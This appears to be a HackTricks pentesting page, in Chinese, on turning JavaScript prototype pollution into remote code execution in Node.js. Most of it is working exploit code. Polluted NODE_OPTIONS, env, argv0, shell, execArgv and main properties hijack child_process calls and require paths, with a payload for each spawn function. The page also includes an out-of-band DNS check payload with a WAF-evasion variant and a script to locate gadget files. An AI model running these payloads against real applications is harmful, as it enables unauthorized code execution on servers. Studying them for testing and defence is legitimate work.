<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Prototype Pollution to RCE</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="prototype-pollution-to-rce"><a class="header" href="#prototype-pollution-to-rce">Prototype Pollution to RCE</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<h2 id="漏洞代码"><a class="header" href="#漏洞代码">漏洞代码</a></h2>
<p>想象一下一个真实的 JS 使用如下代码：</p>
<pre><code class="language-javascript">const { execSync, fork } = require('child_process');

function isObject(obj) {
console.log(typeof obj);
return typeof obj === 'function' || typeof obj === 'object';
}

// Function vulnerable to prototype pollution
function merge(target, source) {
for (let key in source) {
if (isObject(target[key]) &amp;&amp; isObject(source[key])) {
merge(target[key], source[key]);
} else {
target[key] = source[key];
}
}
return target;
}

function clone(target) {
return merge({}, target);
}

// Run prototype pollution with user input
// Check in the next sections what payload put here to execute arbitrary code
clone(USERINPUT);

// Spawn process, this will call the gadget that poputales env variables
// Create an a_file.js file in the current dir: `echo a=2 &gt; a_file.js`
var proc = fork('a_file.js');
</code></pre>
<h2 id="pp2rce-通过环境变量"><a class="header" href="#pp2rce-通过环境变量">PP2RCE 通过环境变量</a></h2>
<p><strong>PP2RCE</strong> 意味着 <strong>原型污染到 RCE</strong>（远程代码执行）。</p>
<p>根据这个 <a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/"><strong>写作</strong></a>，当一个 <strong>进程被生成</strong> 时，使用 <strong><code>child_process</code></strong> 中的某些方法（如 <code>fork</code> 或 <code>spawn</code> 或其他）会调用方法 <code>normalizeSpawnArguments</code>，这是一个 <strong>原型污染工具，用于创建新的环境变量</strong>：</p>
<pre><code class="language-javascript">//See code in https://github.com/nodejs/node/blob/02aa8c22c26220e16616a88370d111c0229efe5e/lib/child_process.js#L638-L686

var env = options.env || process.env;
var envPairs = [];
[...]
let envKeys = [];
// Prototype values are intentionally included.
for (const key in env) {
ArrayPrototypePush(envKeys, key);
}
[...]
for (const key of envKeys) {
const value = env[key];
if (value !== undefined) {
ArrayPrototypePush(envPairs, `${key}=${value}`); // &lt;-- Pollution
}
}
</code></pre>
<p>检查代码，你可以看到通过<strong>污染</strong>属性**<code>.env</code><strong>可以</strong>毒害 <code>envPairs</code>**。</p>
<h3 id="毒害-__proto__"><a class="header" href="#毒害-__proto__"><strong>毒害 <code>__proto__</code></strong></a></h3>
<p>{% hint style="warning" %}
请注意，由于node的**<code>child_process</code><strong>库中的</strong><code>normalizeSpawnArguments</code><strong>函数的工作方式，当调用某个函数以</strong>设置新的环境变量<strong>时，你只需要</strong>污染任何东西**。<br />
例如，如果你执行<code>__proto__.avar="valuevar"</code>，进程将以一个名为<code>avar</code>且值为<code>valuevar</code>的变量被生成。</p>
<p>然而，为了使<strong>环境变量成为第一个</strong>，你需要<strong>污染****<code>.env</code>属性</strong>，并且（仅在某些方法中）该变量将是<strong>第一个</strong>（允许攻击）。</p>
<p>这就是为什么在以下攻击中**<code>NODE_OPTIONS</code><strong>不在</strong><code>.env</code>**内的原因。
{% endhint %}</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce\\\").toString())//"}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
</code></pre>
<p>{% endcode %}</p>
<h3 id="污染-constructorprototype"><a class="header" href="#污染-constructorprototype">污染 <code>constructor.prototype</code></a></h3>
<pre><code class="language-javascript">const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.constructor.prototype.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"}
b.constructor.prototype.NODE_OPTIONS = "--require /proc/self/environ"

proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2
</code></pre>
<h2 id="pp2rce-via-env-vars--cmdline"><a class="header" href="#pp2rce-via-env-vars--cmdline">PP2RCE via env vars + cmdline</a></h2>
<p>与之前的有效载荷类似，提出了一种有一些变化的有效载荷，详见<a href="https://blog.sonarsource.com/blitzjs-prototype-pollution/"><strong>这篇文章</strong></a><strong>.</strong> 主要区别在于：</p>
<ul>
<li>它不是将nodejs <strong>有效载荷</strong> 存储在文件 <code>/proc/self/environ</code> 中，而是存储在 <strong><code>/proc/self/cmdline</code></strong> 的 <strong>argv0</strong> 中。</li>
<li>然后，它不是通过 <strong><code>NODE_OPTIONS</code></strong> 要求文件 <code>/proc/self/environ</code>，而是 <strong>要求 <code>/proc/self/cmdline</code></strong>。</li>
</ul>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"
b.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
</code></pre>
<p>{% endcode %}</p>
<h2 id="dns-交互"><a class="header" href="#dns-交互">DNS 交互</a></h2>
<p>使用以下有效载荷，可以滥用我们之前讨论过的 NODE_OPTIONS 环境变量，并通过 DNS 交互检测其是否有效：</p>
<pre><code class="language-json">{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id.oastify.com"
}
}
</code></pre>
<p>或者，为了避免 WAF 询问域名：</p>
<pre><code class="language-json">{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"
}
}
</code></pre>
<h2 id="pp2rce-漏洞-child_process-函数"><a class="header" href="#pp2rce-漏洞-child_process-函数">PP2RCE 漏洞 child_process 函数</a></h2>
<p>在本节中，我们将分析 <strong><code>child_process</code> 中的每个函数</strong> 以执行代码，并查看我们是否可以使用任何技术强制该函数执行代码：</p>
<details>
<summary><code>exec</code> 利用</summary>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">// environ trick - not working
// It's not possible to pollute the .env attr to create a first env var
// because options.env is null (not undefined)

// cmdline trick - working with small variation
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = exec('something');

// stdin trick - not working
// Not using stdin

// Windows
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = exec('something');
</code></pre>
<p>{% endcode %}</p>
</details>
<details>
<summary><strong><code>execFile</code> 利用</strong></summary>
```javascript
// environ trick - not working
// It's not possible to pollute the .en attr to create a first env var
<p>// cmdline trick - working with a big requirement
// Working after kEmptyObject (fix)
const { execFile } = require('child_process');
p = {}
p.<strong>proto</strong>.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.<strong>proto</strong>.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFile-cmdline').toString())//"
p.<strong>proto</strong>.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFile('/usr/bin/node');</p>
<p>// stdin trick - not working
// Not using stdin</p>
<p>// Windows - not working</p>
<pre><code>为了使 **`execFile`** 工作，它 **必须执行 node** 以使 NODE\_OPTIONS 生效。\
如果它 **不** 在执行 **node**，你需要找到如何通过 **环境变量** 来 **改变执行** 的内容并设置它们。

**其他** 技术在没有此要求的情况下 **工作**，因为可以通过原型污染 **修改** **被执行的内容**。 （在这种情况下，即使你可以污染 `.shell`，你也不会污染正在被执行的内容）。

&lt;/details&gt;

&lt;details&gt;

&lt;summary&gt;&lt;code&gt;fork&lt;/code&gt; 利用&lt;/summary&gt;

{% code overflow="wrap" %}
```javascript
// environ trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/fork-environ').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = fork('something');

// cmdline trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
p = {}
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/fork-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = fork('something');

// stdin trick - not working
// Not using stdin

// execArgv trick - working
// Only the fork method has this attribute
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "/bin/sh"
b.__proto__.argv0 = "/bin/sh"
b.__proto__.execArgv = ["-c", "touch /tmp/fork-execArgv"]
var proc = fork('./a_file.js');

// Windows
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = fork('./a_file.js');
</code></pre>
<p>{% endcode %}</p>
</details>
<details>
<summary><strong><code>spawn</code> 利用</strong></summary>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawn-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawn-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - not working
// Not using stdin

// Windows
// NOT working after require(fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
</code></pre>
<p>{% endcode %}</p>
</details>
<details>
<summary><strong><code>execFileSync</code> 利用</strong></summary>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execFileSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execFileSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFileSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFileSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execFileSync-stdin}\n'
var proc = execFileSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
p.__proto__.argv0 = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
</code></pre>
<p>{% endcode %}</p>
</details>
<details>
<summary><strong><code>execSync</code> 利用</strong></summary>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execSync-stdin}\n'
var proc = execSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
</code></pre>
<p>{% endcode %}</p>
</details>
<details>
<summary><strong><code>spawnSync</code> 利用</strong></summary>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of node
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawnSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawnSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - working
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/spawnSync-stdin}\n'
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)

// Windows
// NOT working after require(fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
</code></pre>
<p>{% endcode %}</p>
</details>
<h2 id="强制生成"><a class="header" href="#强制生成">强制生成</a></h2>
<p>在之前的示例中，您看到如何触发小工具，功能需要<strong>调用 <code>spawn</code><strong>的功能</strong>存在</strong>（所有用于执行某些内容的**<code>child_process</code><strong>方法都会调用它）。在之前的示例中，这是</strong>代码的一部分**，但如果代码<strong>没有</strong>调用它呢？</p>
<h3 id="控制-require-文件路径"><a class="header" href="#控制-require-文件路径">控制 require 文件路径</a></h3>
<p>在这个<a href="https://blog.sonarsource.com/blitzjs-prototype-pollution/"><strong>其他写作</strong></a>中，用户可以控制将执行的**<code>require</code><strong>的文件路径。在这种情况下，攻击者只需</strong>在系统中找到一个 <code>.js</code> 文件**，该文件在导入时将<strong>执行一个 spawn 方法。</strong><br />
一些常见的在导入时调用 spawn 函数的文件示例包括：</p>
<ul>
<li>/path/to/npm/scripts/changelog.js</li>
<li>/opt/yarn-v1.22.19/preinstall.js</li>
<li>在下面<strong>找到更多文件</strong></li>
</ul>
<p>以下简单脚本将搜索<strong>来自</strong>child_process<strong>的调用</strong>，<strong>没有任何填充</strong>（以避免显示函数内部的调用）：</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">find / -name "*.js" -type f -exec grep -l "child_process" {} \; 2&gt;/dev/null | while read file_path; do
grep --with-filename -nE "^[a-zA-Z].*(exec\(|execFile\(|fork\(|spawn\(|execFileSync\(|execSync\(|spawnSync\()" "$file_path" | grep -v "require(" | grep -v "function " | grep -v "util.deprecate" | sed -E 's/.{255,}.*//'
done
# Note that this way of finding child_process executions just importing might not find valid scripts as functions called in the root containing child_process calls won't be found.
</code></pre>
<p>{% endcode %}</p>
<details>
<summary>之前脚本发现的有趣文件</summary>
<ul>
<li>node_modules/buffer/bin/<strong>download-node-tests.js</strong>:17:<code>cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })</code></li>
<li>node_modules/buffer/bin/<strong>test.js</strong>:10:<code>var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })</code></li>
<li>node_modules/npm/scripts/<strong>changelog.js</strong>:16:<code>const log = execSync(git log --reverse --pretty='format:%h %H%d %s (%aN)%n%b%n---%n' ${branch}...).toString().split(/\n/)</code></li>
<li>node_modules/detect-libc/bin/<strong>detect-libc.js</strong>:18:<code>process.exit(spawnSync(process.argv[2], process.argv.slice(3), spawnOptions).status);</code></li>
<li>node_modules/jest-expo/bin/<strong>jest.js</strong>:26:<code>const result = childProcess.spawnSync('node', jestWithArgs, { stdio: 'inherit' });</code></li>
<li>node_modules/buffer/bin/<strong>download-node-tests.js</strong>:17:<code>cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })</code></li>
<li>node_modules/buffer/bin/<strong>test.js</strong>:10:<code>var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })</code></li>
<li>node_modules/runtypes/scripts/<strong>format.js</strong>:13:<code>const npmBinPath = execSync('npm bin').toString().trim();</code></li>
<li>node_modules/node-pty/scripts/<strong>publish.js</strong>:31:<code>const result = cp.spawn('npm', args, { stdio: 'inherit' });</code></li>
</ul>
</details>
<h3 id="通过原型污染设置-require-文件路径"><a class="header" href="#通过原型污染设置-require-文件路径">通过原型污染设置 require 文件路径</a></h3>
<p>{% hint style="warning" %}
<strong>之前的技术要求</strong> <strong>用户控制将要被 require 的文件路径</strong>。但这并不总是正确的。
{% endhint %}</p>
<p>然而，如果代码在原型污染后执行 require，即使你<strong>不控制将要被 require 的路径</strong>，你<strong>可以通过滥用原型污染强制使用不同的路径</strong>。因此，即使代码行是 <code>require("./a_file.js")</code> 或 <code>require("bytes")</code>，它将<strong>require你污染的包</strong>。</p>
<p>因此，如果在你的原型污染后执行了 require，并且没有 spawn 函数，这就是攻击：</p>
<ul>
<li>找到一个<strong>系统内的 <code>.js</code> 文件</strong>，当被<strong>require</strong>时将<strong>使用 <code>child_process</code> 执行某些操作</strong></li>
<li>如果你可以向你攻击的平台上传文件，你可以上传这样的文件</li>
<li>污染路径以<strong>强制 require 加载将使用 child_process 执行某些操作的 <code>.js</code> 文件</strong></li>
<li><strong>污染环境/命令行</strong>以在调用 child_process 执行函数时执行任意代码（参见初始技术）</li>
</ul>
<h4 id="绝对-require"><a class="header" href="#绝对-require">绝对 require</a></h4>
<p>如果执行的 require 是<strong>绝对的</strong>（<code>require("bytes")</code>），并且<strong>包在 <code>package.json</code> 文件中不包含 main</strong>，你可以<strong>污染 <code>main</code> 属性</strong>并使<strong>require 执行不同的文件</strong>。</p>
<p>{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Install package bytes (it doesn't have a main in package.json)
// npm install bytes

// Manual Pollution
b = {}
b.__proto__.main = "/tmp/malicious.js"

// Trigger gadget
var proc = require('bytes');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"main": "/tmp/malicious.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_absolute\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('bytes');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
</code></pre>
<p>{% endcode %}
{% endtab %}</p>
<p>{% tab title="恶意.js" %}</p>
<pre><code class="language-javascript">const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork("anything");
</code></pre>
<p>{% endtab %}
{% endtabs %}</p>
<h4 id="相对-require---1"><a class="header" href="#相对-require---1">相对 require - 1</a></h4>
<p>如果加载的是<strong>相对路径</strong>而不是绝对路径，您可以使 node <strong>加载不同的路径</strong>：</p>
<p>{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.exports = { ".": "./malicious.js" }
b.__proto__["1"] = "/tmp"

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"exports": {".": "./malicious.js"}, "1": "/tmp", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_1\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
</code></pre>
<p>{% endcode %}
{% endtab %}</p>
<p>{% tab title="恶意.js" %}</p>
<pre><code class="language-javascript">const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
</code></pre>
<p>{% endtab %}
